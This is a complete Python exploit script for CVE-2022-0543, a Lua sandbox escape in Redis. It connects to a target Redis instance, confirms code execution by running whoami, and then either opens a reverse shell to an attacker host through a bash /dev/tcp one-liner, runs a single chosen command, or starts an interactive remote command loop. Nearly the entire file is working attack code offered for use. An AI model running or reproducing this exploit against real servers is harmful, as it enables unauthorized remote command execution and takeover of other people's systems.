import argparse
import redis
from termcolor import colored

def print_message(message, type):
   if type == 'SUCCESS':
        print('[' + colored('SUCCESS', 'green') +  '] ' + message)
   elif type == 'INFO':
        print('[' + colored('INFO', 'blue') +  '] ' + message)
   elif type == 'WARNING':
        print('[' + colored('WARNING', 'yellow') +  '] ' + message)
   elif type == 'ALERT':
        print('[' + colored('ALERT', 'yellow') +  '] ' + message)
   elif type == 'ERROR':
        print('[' + colored('ERROR', 'red') +  '] ' + message)

def redis_command(session, command):
    command_result_raw = session.eval(command, 0)
    return command_result_raw.decode('ascii').strip()

parser = argparse.ArgumentParser(description='Exploit for CVE-2022-0543: Lua Sandbox Escape in Redis')
parser.add_argument('-i', '--ip', type=str, default="127.0.0.1",
                  help='IP address of victim Redis instance (Default: 127.0.0.1)')
parser.add_argument('-p', '--port', type=str, default="6379",
                  help='Port of victim Redis instance (Default: 6379)')
parser.add_argument('-u', '--username', default=None, type=str,
                  help='The username for authentication (Default: None)')
parser.add_argument('-s', '--password', default=None, type=str,
                  help='The password for authentication (Default: None)')
parser.add_argument('-I', '--atk-ip', type=str,
                  help='IP address for automatic reverse shell (Default: Disabled)')
parser.add_argument('-P', '--atk-port', type=str,
                  help='Port for automatic reverse shell (Default: Disabled)')
parser.add_argument('-x', '--command', type=str,
                  help='Single command to execute (Default: Disabled)')
parser.add_argument('-c', '--check', action='store_true',
                  help='Check vulnerability with minimal exploitation (Default: Disabled)')

args = parser.parse_args()

sandbox_escape = 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("{payload}", "r"); local res = f:read("*a"); f:close(); return res'

try:
    session = redis.Redis(host=args.ip,port=args.port,username=args.username,password=args.password)
except Exception as e:
    print_message('Unable to connect to the provided host {ip}:{port}'.format(ip=args.ip,port=args.port), "ERROR")
    exit(e)
else:
    print_message('Connected to {ip}:{port}!'.format(ip=args.ip,port=args.port), "SUCCESS")

try:
    payload = "whoami"
    command = sandbox_escape.format(payload=payload)
    redis_user = redis_command(session, command)
except redis.exceptions.AuthenticationError:
    if not args.username or not args.password:
        print_message('This Redis instance requires authentication ([-u] and -s)', "ERROR")
        exit()
    else:
        print_message('The provided credentials are incorrect', "ERROR")
        exit()
except Exception as e:
    print_message('Could not execute command', "ERROR")
    print(e)
    exit()
else:
    if redis_user == "":
        print_message('The system might not be vulnerable', "ERROR")
        exit()
    else:
        print_message('The system might be vulnerable!', "SUCCESS")
        print_message('Redis is running as "{user}"'.format(user=redis_user), "INFO")

if args.check:
    print_message('The system appears to be vulnerable', "ALERT")
    print_message('Remove -c from your command if you wish to exploit the system!', "INFO")
    exit()

if args.atk_ip and args.atk_port:
    print_message('Running reverse shell. Check your listener!', "INFO")
    try:
        reverse_shell = "bash -c 'exec bash -i &>/dev/tcp/{ip}/{port} <&1'"
        payload = reverse_shell.format(ip=args.atk_ip,port=args.atk_port)
        command = sandbox_escape.format(payload=payload)
        redis_command(session, command)
    except Exception as e:
        print_message('Could not execute reverse shell', "ERROR")
elif args.command:
    print_message('Running your command: "{command}"!'.format(command=args.command), "INFO")
    try:
        command = sandbox_escape.format(payload=args.command)
        result = redis_command(session, command)
        print(result)
    except Exception as e:
        print_message('Could not execute your command', "ERROR")
else:
    print_message('Please enter your command below!', "INFO")
    while True:
        input_command = input(colored('>>', 'green'))
        if input_command in {'q','exit','quit','exit()','quit()'}:
            exit()
        command = sandbox_escape.format(payload=input_command)
        result = redis_command(session, command)
        print(result)
